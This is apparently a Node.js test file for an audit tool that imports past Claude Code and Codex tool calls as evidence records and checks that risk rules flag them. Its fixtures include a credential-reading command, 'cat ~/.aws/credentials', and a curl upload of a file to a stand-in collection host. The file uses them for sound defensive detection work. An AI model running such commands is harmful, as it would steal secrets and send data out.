// History import (src/agent-history.mjs, scripts/import-agent-history.mjs): past tool calls read from Claude Code transcripts and Codex
// rollouts become the records the live hook would have sent, with the same event ids, only minimized tool-call metadata and the
// history_import mark. The end-to-end test runs the CLI against an in-process EvidScope behind a local HTTP listener: a dry run sends
// nothing; a real run is audited by the risk and sequence rules under engine v8; a second run sends nothing new.
import test from 'node:test';
import assert from 'node:assert/strict';
import {execFile} from 'node:child_process';
import {mkdirSync, readFileSync, writeFileSync} from 'node:fs';
import {createServer} from 'node:http';
import {createPrivateKey, createPublicKey} from 'node:crypto';
import {join} from 'node:path';
import {fileURLToPath} from 'node:url';
import {tempDir} from './temp-dir.mjs';
import {MARKER, CLAUDE_SESSION, CODEX_SESSION, writeClaudeTranscripts, writeCodexRollouts} from './agent-history-fixtures.mjs';
import {HistoryImportError, codexOutcome, readAgentHistory, sendHistory, transcriptFiles} from '../src/agent-history.mjs';
import {HISTORY_IMPORT, hookEvent} from '../src/agent-hook-events.mjs';
import {runHook} from '../src/agent-hook-runner.mjs';
import {INGEST_ID_CONFLICT} from '../src/event-ingest.mjs';
import {EVALUATION_ENGINE_V8, validateEvent} from '../src/model.mjs';
import {initialize} from '../scripts/init.mjs';
import {createService} from '../src/service.mjs';
import {evaluateJob} from '../src/worker.mjs';
import {verifyAndReplay} from '../src/policy-replay.mjs';

const BASE = new Date('2026-09-01T10:00:00.000Z'), at = seconds => new Date(BASE.getTime() + seconds * 1000).toISOString();
const actor = 'claude-code@test-pc', agentSource = {id: 'alpha-agent', tenant: 'alpha', kind: 'agent'};
const script = fileURLToPath(new URL('../scripts/import-agent-history.mjs', import.meta.url));
const fixtures = (base = BASE) => {
  const root = tempDir('evidscope-history-fixtures-');
  writeClaudeTranscripts(join(root, 'claude'), base); writeCodexRollouts(join(root, 'codex'), base);
  return root;
};
const byAction = calls => Object.fromEntries(calls.map(call => [call.records[0].actionId, call.records]));
// What the live hook would have built for the same call (src/agent-hook-runner.mjs), without the import mark.
const live = (tool, session, id, name, input, phase = 'PreToolUse', extra = {}) => hookEvent({hook_event_name: phase, session_id: session,
  tool_use_id: id, tool_name: name, tool_input: input, ...extra}, {actor, policyVersion: 'cc-v1', tool, now: new Date()});

test('Claude Code transcripts: tool_use and tool_result pairs become intents and outcomes; other lines are skipped', async () => {
  const root = fixtures(), {calls, stats} = await readAgentHistory({agent: 'claude-code', dir: join(root, 'claude'), actor, policyVersion: 'cc-v1'});
  assert.deepEqual(stats, {files: 4, unreadableFiles: 0, malformedLines: 1, malformedCalls: 1, calls: 10, withOutcome: 6,
    skipped: {sidechain: 2, noTime: 1, outOfRange: 0, overLimit: 0, repeated: 1, unknown: {}}});
  const records = byAction(calls);
  assert.deepEqual(calls.map(call => call.records[0].actionId),
    ['toolu_aws', 'toolu_read', 'toolu_test', 'toolu_write', 'toolu_fetch', 'toolu_mcp', 'toolu_curl', 'toolu_task'], 'in time order');
  assert.deepEqual(Object.values(records).map(r => r.map(e => `${e.kind}:${e.status}`)), [
    ['intent:requested', 'self_report:success'], ['intent:requested', 'self_report:failure'], ['intent:requested', 'self_report:failure'],
    ['intent:requested'], ['intent:requested', 'self_report:success'], ['intent:requested', 'self_report:success'],
    ['intent:requested', 'self_report:success'], ['intent:requested']]);
  const [pre, post] = records.toolu_aws;
  assert.deepEqual([pre.occurredAt, post.occurredAt, pre.traceId, pre.tool, pre.actor, pre.policyVersion, pre.note],
    [at(5), at(6), CLAUDE_SESSION, 'claude-code', actor, 'cc-v1', '[Bash] cat ~/.aws/credentials']);
  assert.equal(records.toolu_read[0].resource, 'c:/users/kim/work/shop/readme.md');
  assert.deepEqual([records.toolu_fetch[0].resource, records.toolu_fetch[0].destination], ['https://docs.example.com/guide', 'docs.example.com']);
  assert.deepEqual([records.toolu_mcp[0].action, records.toolu_mcp[0].note], ['mcp_call', '[mcp__github__create_issue]']);
  assert.deepEqual([records.toolu_task[0].action, records.toolu_task[0].note], ['subagent', '[Task] explore repo']);
  assert.equal(calls.find(call => call.records[0].actionId === 'toolu_curl').project, 'C:\\Users\\Kim\\work\\api');
  for (const event of calls.flatMap(call => call.records)) {
    assert.equal(event.collection, HISTORY_IMPORT);
    const stored = validateEvent(event, agentSource);
    assert.equal(stored.late, true, 'an imported record reads as late evidence');
  }
  assert.ok(!JSON.stringify(calls).includes(MARKER), 'no prompt, answer, tool output or free-text input is in any record');
  // The same call collected live has the same event id and target; only the time and the mark differ.
  const input = {command: 'cat ~/.aws/credentials', description: 'other text'}, hooked = live('claude-code', CLAUDE_SESSION, 'toolu_aws', 'Bash', input);
  assert.deepEqual([pre.id, pre.actionId, pre.resource, pre.note], [hooked.id, hooked.actionId, hooked.resource, hooked.note]);
  assert.equal(post.id, live('claude-code', CLAUDE_SESSION, 'toolu_aws', 'Bash', input, 'PostToolUse', {tool_response: {}}).id);
  assert.deepEqual(Object.keys(pre).filter(k => !(k in hooked)), ['collection']);
});

test('Claude Code: time range, limit, and subagent calls on request', async () => {
  const dir = join(fixtures(), 'claude'), read = options => readAgentHistory({agent: 'claude-code', dir, actor, ...options});
  const range = await read({since: new Date(at(15)), until: new Date(at(305))});
  assert.deepEqual(range.calls.map(call => call.records[0].actionId), ['toolu_test', 'toolu_write', 'toolu_fetch', 'toolu_mcp', 'toolu_curl']);
  assert.equal(range.stats.skipped.outOfRange, 3);
  const two = await read({limit: 2});
  assert.deepEqual(two.calls.map(call => call.records[0].actionId), ['toolu_aws', 'toolu_read']);
  assert.equal(two.stats.skipped.overLimit, 6);
  const sidechains = await read({sidechains: true});
  assert.equal(sidechains.stats.skipped.sidechain, 0);
  assert.deepEqual(sidechains.calls.map(call => call.records[0].actionId).filter(id => ['toolu_side', 'toolu_sub'].includes(id)), ['toolu_side', 'toolu_sub']);
  assert.deepEqual(byAction(sidechains.calls).toolu_side.map(e => e.status), ['requested', 'success']);
  assert.deepEqual(transcriptFiles('codex', dir), [], 'Codex reads only rollout files');
});

test('a transcript saved with a byte order mark and Windows line endings reads the same', async () => {
  const dir = tempDir('evidscope-history-crlf-'), session = 'e1e2e3e4-0000-1111-2222-333344445555';
  const lines = [{type: 'assistant', sessionId: session, timestamp: at(0), message: {content: [{type: 'tool_use', id: 'toolu_crlf', name: 'Bash',
    input: {command: 'whoami'}}]}}, {type: 'user', sessionId: session, timestamp: at(1), message: {content: [{type: 'tool_result',
    tool_use_id: 'toolu_crlf', content: MARKER, is_error: false}]}}];
  mkdirSync(join(dir, 'C--work'), {recursive: true});
  writeFileSync(join(dir, 'C--work', `${session}.jsonl`), '﻿' + lines.map(line => JSON.stringify(line)).join('\r\n') + '\r\n');
  const {calls, stats} = await readAgentHistory({agent: 'claude-code', dir, actor});
  assert.equal(stats.malformedLines, 0);
  assert.deepEqual(calls[0].records.map(e => [e.kind, e.status, e.note]),
    [['intent', 'requested', '[Bash] whoami'], ['self_report', 'success', '[Bash] whoami']]);
});

test('Codex rollouts: function, custom and local shell calls with their outputs; unknown items are counted', async () => {
  const root = fixtures(), codex = {agent: 'codex', dir: join(root, 'codex'), actor: 'codex@test-pc', policyVersion: 'codex-v1'};
  const {calls, stats} = await readAgentHistory(codex);
  assert.deepEqual(stats, {files: 1, unreadableFiles: 0, malformedLines: 1, malformedCalls: 1, calls: 6, withOutcome: 5,
    skipped: {sidechain: 0, noTime: 0, outOfRange: 0, overLimit: 0, repeated: 0, unknown: {web_search_call: 1}}});
  const records = byAction(calls);
  assert.deepEqual(Object.entries(records).map(([id, r]) => [id, r.map(e => e.status), r[0].note]), [
    ['call_aws', ['requested', 'success'], '[Bash] bash -lc cat ~/.aws/credentials'],
    ['call_test', ['requested', 'failure'], '[Bash] npm test'],
    ['call_patch', ['requested', 'success'], '[apply_patch] patch src/app.js'],
    ['call_local', ['requested', 'success'], '[Bash] git status'],
    ['call_plan', ['requested'], '[update_plan]'],
    ['call_exec', ['requested', 'success'], '[Bash] curl -d @notes.txt https://collect.example.net/in']]);
  assert.deepEqual([records.call_patch[0].action, records.call_patch[0].resource], ['file_write', 'src/app.js']);
  assert.equal(records.call_exec[0].destination, 'collect.example.net');
  assert.ok(calls.flatMap(call => call.records).every(e => e.tool === 'codex' && e.traceId === CODEX_SESSION && e.collection === HISTORY_IMPORT));
  assert.ok(!JSON.stringify(calls).includes(MARKER));
  const hooked = hookEvent({hook_event_name: 'PreToolUse', session_id: CODEX_SESSION, tool_use_id: 'call_aws', tool_name: 'Bash',
    tool_input: {command: ['bash', '-lc', 'cat ~/.aws/credentials']}}, {actor: 'codex@test-pc', tool: 'codex'});
  assert.deepEqual([records.call_aws[0].id, records.call_aws[0].note], [hooked.id, hooked.note]);
  assert.match(records.call_aws[0].id, /^cx\./);
  assert.deepEqual(codexOutcome('{"output":"x","metadata":{"exit_code":2}}'), {exit_code: 2});
  assert.deepEqual(codexOutcome('Exit code: 0\nOutput:\nExit code: 1'), {exit_code: 0});
  assert.deepEqual(codexOutcome({content: 'x', success: false}), {success: false});
  assert.deepEqual(codexOutcome('plain text'), {});
});

test('sending: duplicates, conflicts, erased ids and queued records are already present; refusals are counted; 503 is retried', async () => {
  const calls = ['a', 'b', 'c', 'd', 'e', 'f'].map(id => ({records: [{id: `${id}.pre`}]}));
  const answers = {'a.pre': [[202, {accepted: true, duplicate: false}]], 'b.pre': [[202, {accepted: true, duplicate: true}]],
    'c.pre': [[409, {error: INGEST_ID_CONFLICT.content}]], 'd.pre': [[409, {error: INGEST_ID_CONFLICT.erased}]],
    'e.pre': [[400, {error: 'bad'}]], 'f.pre': [[503, {error: 'busy'}], [202, {accepted: true, duplicate: false}]]};
  const waits = [], send = async event => { const [status, body] = answers[event.id].shift(); return {status, text: JSON.stringify(body)}; };
  const result = await sendHistory([...calls, {records: [{id: 'g.pre'}]}], {send, skip: new Set(['g.pre']), wait: async ms => { waits.push(ms); }});
  assert.deepEqual(result, {sent: 6, accepted: 2, alreadyPresent: 4, present: {duplicate: 1, conflict: 1, erased: 1, queued: 1}, rejected: 1,
    reasons: {'HTTP 400 bad': 1}});
  assert.deepEqual(waits, [500]);
  const refused = async () => ({status: 401, text: JSON.stringify({error: '출처 서명 검증 실패'})});
  await assert.rejects(sendHistory(calls, {send: refused, concurrency: 1}), error => error instanceof HistoryImportError && error.result.sent === 0);
  const down = async () => { throw new TypeError('fetch failed'); };
  await assert.rejects(sendHistory(calls, {send: down, networkRetries: 2, wait: async () => {}}), /after 3 attempts \(fetch failed\)/);
  const busy = async () => ({status: 503, text: JSON.stringify({error: '분석 적체'})});
  await assert.rejects(sendHistory(calls, {send: busy, retries: 5, wait: async () => {}}), /after 6 attempts \(HTTP 503 분석 적체\)/);
});

// The CLI against an in-process EvidScope (as test/synthetic-records.test.mjs) behind a local HTTP listener for POST /api/ingest.
async function evidscope(t) {
  const dir = tempDir('evidscope-history-vault-'), config = initialize(dir), key = readFileSync(join(dir, 'signing-private.pem'), 'utf8');
  const s = createService({dataDir: join(dir, 'data'), config, key});
  t.after(() => s.store.close());
  const principal = id => config.principals.find(p => p.id === id), as = id => ({authorization: 'Bearer ' + principal(id).token});
  const get = (path, id = 'alpha-auditor') => s.handle('GET', new URL('http://localhost' + path), as(id));
  const post = (path, body, id = 'alpha-reviewer') => s.handle('POST', new URL('http://localhost' + path), as(id), JSON.stringify(body));
  const server = createServer(async (req, res) => {
    let body = '';
    for await (const chunk of req) body += chunk;
    try {
      const out = await s.handle(req.method, new URL(req.url, 'http://localhost'), req.headers, body);
      res.writeHead(202, {'content-type': 'application/json'}).end(JSON.stringify(out));
    } catch (error) {
      res.writeHead(error.status || 503, {'content-type': 'application/json'}).end(JSON.stringify({error: error.status ? error.message : 'unavailable'}));
    }
  });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  t.after(() => new Promise(resolve => { server.closeAllConnections(); server.close(() => resolve()); }));
  async function analyze() {
    for (let i = 0; i < 50; i++) {
      const claim = await s.handle('POST', new URL('http://localhost/internal/claim'), as('analysis-worker'), '{}');
      if (!claim.jobs.length) return;
      for (const job of claim.jobs) await s.handle('POST', new URL('http://localhost/internal/complete'), as('analysis-worker'),
        JSON.stringify({leaseId: job.leaseId, result: evaluateJob(job)}));
    }
  }
  const events = () => s.store.db.prepare("SELECT COUNT(*) n FROM events WHERE tenant='alpha'").get().n;
  return {dir, s, get, post, analyze, events, url: `http://127.0.0.1:${server.address().port}`, agent: principal('alpha-agent'),
    publicKey: createPublicKey(createPrivateKey(key))};
}
// The summary is the JSON object the CLI prints last (after the dry run's preview lines).
const summaryOf = stdout => { try { return JSON.parse(stdout.slice(stdout.indexOf('\n{\n') + 1)); } catch { return null; } };
const cli = args => new Promise(resolve => execFile(process.execPath, [script, ...args], {env: {...process.env, EVIDSCOPE_HOOK_CONFIG: ''}},
  (error, stdout, stderr) => resolve({code: error ? error.code : 0, stdout, stderr, summary: summaryOf(stdout)})));

test('end to end: a dry run sends nothing; a real run is audited (engine v8); a second run finds every record already present', async t => {
  const f = await evidscope(t), base = new Date(Date.now() - 2 * 86400e3), root = fixtures(base), configPath = join(f.dir, 'claude-code-hook.json');
  const policyVersion = 'claude-code-monitoring-v1';
  writeFileSync(configPath, JSON.stringify({url: f.url, token: f.agent.token, hmacSecret: f.agent.hmacSecret, actor, policyVersion}));
  await f.post('/api/assets', {id: 'asset.claude-code.test-pc', actor, tool: 'claude-code', owner: 'local user', purpose: 'test', policyVersion,
    approvalRequired: false, validFrom: new Date(Date.now() - 60000).toISOString()});
  const pack = JSON.parse(readFileSync(new URL('../data/risk-rules/ai-agent-baseline.json', import.meta.url), 'utf8'));
  for (const r of pack.rules.filter(r => ['risk.cred.aws', 'risk.out.curl-data'].includes(r.id))) {
    const draft = await f.post('/api/rules', {id: r.id, title: r.title, field: r.field, op: r.op, value: r.value, severity: r.severity});
    await f.post(`/api/rules/${r.id}/test`, {version: draft.version});
    await f.post(`/api/rules/${r.id}/approve`, {version: draft.version}, 'alpha-admin');
  }
  // One call was already collected live: the hook sent its intent, and its outcome waits in the hook's spool.
  const read = {session_id: CLAUDE_SESSION, tool_use_id: 'toolu_read', tool_name: 'Read', tool_input: {file_path: 'C:\\Users\\Kim\\work\\shop\\README.md'}};
  await runHook('claude-code', {env: {EVIDSCOPE_HOOK_CONFIG: configPath}, input: JSON.stringify({...read, hook_event_name: 'PreToolUse'})});
  assert.equal(f.events(), 1);
  const queued = hookEvent({...read, hook_event_name: 'PostToolUse', tool_response: {is_error: true}}, {actor, policyVersion});
  writeFileSync(join(f.dir, 'claude-code-spool.jsonl'), JSON.stringify(queued) + '\n');
  const args = ['--dir', join(root, 'claude'), '--config', configPath];

  const dry = await cli([...args, '--dry-run']);
  assert.equal(dry.code, 0, dry.stderr);
  assert.match(dry.stdout, /Dry run: nothing is sent\. 8 tool call\(s\) in 2 session\(s\)\./);
  assert.match(dry.stdout, /intent shell_exec \[Bash\] cat ~\/\.aws\/credentials/);
  assert.deepEqual([dry.summary.ingest, dry.summary.actor, dry.summary.records], [f.url, actor, {built: 14}]);
  assert.ok(!dry.stdout.includes(f.agent.token) && !dry.stdout.includes(f.agent.hmacSecret), 'credentials are never printed');
  assert.equal(f.events(), 1, 'a dry run sends nothing');

  const first = await cli(args);
  assert.equal(first.code, 0, first.stderr);
  assert.deepEqual(first.summary.records, {built: 14, sent: 13, accepted: 12, alreadyPresent: 2,
    present: {duplicate: 0, conflict: 1, erased: 0, queued: 1}, rejected: 0, reasons: {}});
  assert.equal(f.events(), 13);
  await f.analyze();
  const alerts = (await f.get('/api/alerts')).items, codes = id => alerts.filter(a => a.actionId === id).map(a => a.code);
  assert.ok(codes('toolu_aws').includes('CUSTOM:risk.cred.aws:v1'), 'the risk rule audits the imported call');
  assert.ok(codes('toolu_curl').includes('SEQ_SENSITIVE_THEN_OUTBOUND'), 'and the sequence rule links calls of two past sessions');
  assert.deepEqual(alerts.filter(a => a.code === 'LATE_EVIDENCE'), [], 'imported records raise no lateness alert');
  const action = await f.get('/api/actions/toolu_aws');
  assert.deepEqual(action.events.map(e => [e.kind, e.collection, e.late]), [['intent', HISTORY_IMPORT, true], ['self_report', HISTORY_IMPORT, true]]);
  assert.equal(action.evaluations[0].replay.engine, EVALUATION_ENGINE_V8);
  const kept = await f.get('/api/actions/toolu_read');
  assert.deepEqual(kept.events.map(e => [e.kind, e.collection ?? 'live']), [['intent', 'live']], 'the live record keeps its place');

  const second = await cli(args);
  assert.equal(second.code, 0, second.stderr);
  assert.deepEqual(second.summary.records, {built: 14, sent: 13, accepted: 0, alreadyPresent: 14,
    present: {duplicate: 12, conflict: 1, erased: 0, queued: 1}, rejected: 0, reasons: {}});
  assert.equal(f.events(), 13, 'nothing new is stored');
  const report = verifyAndReplay(f.s.store.bundle('alpha'), f.publicKey);
  assert.equal(report.valid, true, JSON.stringify(report.evaluations.filter(e => e.status !== 'replayed')));
  assert.ok(report.evaluations.length >= 8 && report.evaluations.every(e => e.status === 'replayed'));

  const missing = await cli(['--dir', join(root, 'claude'), '--config', join(f.dir, 'missing.json')]);
  assert.deepEqual([missing.code, missing.summary], [1, null]);
  assert.match(missing.stderr, /No usable hook config/);
});
